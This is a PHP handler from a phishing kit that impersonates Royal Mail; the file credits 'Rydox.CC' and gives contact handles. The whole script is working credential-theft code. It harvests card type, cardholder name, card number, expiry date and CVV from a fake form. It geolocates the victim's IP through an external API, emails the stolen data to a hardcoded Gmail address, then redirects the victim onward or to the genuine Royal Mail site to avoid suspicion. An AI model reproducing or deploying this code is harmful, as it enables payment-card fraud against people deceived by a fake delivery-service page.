<?php
// Rydox.CC Coding.
// www.rydox.cc
// Telegram : @RydoxTm
// ICQ : @Rydox

$recipient = 'arbenkeci18@gmail.com'; // Put your email address herez
$over = 'https://www.royalmail.com/';//website
if(isset($_POST['cardtype'])){

function visitor_country()
	{
		
	$ip = getenv("REMOTE_ADDR");
	$result = "Unknown";
	$ch = curl_init();
	curl_setopt($ch, CURLOPT_URL, "https://api.ip.sb/geoip/");
	curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);

	$country = json_decode(curl_exec($ch))->country;
	
	if ($country != null)
		{
		$result = $country;
		}

	return $result;
	}

$country = visitor_country();

	$ip = getenv("REMOTE_ADDR");
	
    $message.= "Type of Card: " . $_POST['cardtype'] . "\n";
    $message.= "Name on Card: " . $_POST['nameoncard'] . "\n";
    $message.= "Card Number: " . $_POST['cardnumber'] . "\n";
    $message.= "Exp Date: " . $_POST['expdate'] . "\n";
    $message.= "CVV: " . $_POST['cvv'] . "\n";
	$message.= "Client IP      : $ip\n";
	$message.= "Client Country      : $country\n";
	$subject = "Royalmail | True Login: " . $ip . "\n";

	if (mail($recipient, $subject, $message))
		{
			header("Location: index4.php");
		}
	  else
		{
		header("Location: $over?error&id=$pass&.rand=13InboxLight.aspx?n=1774256418&fid=4#n=1252899642&fid=1&fav=1");
		
		}
	}else{
        header("Location: index.php");
	}
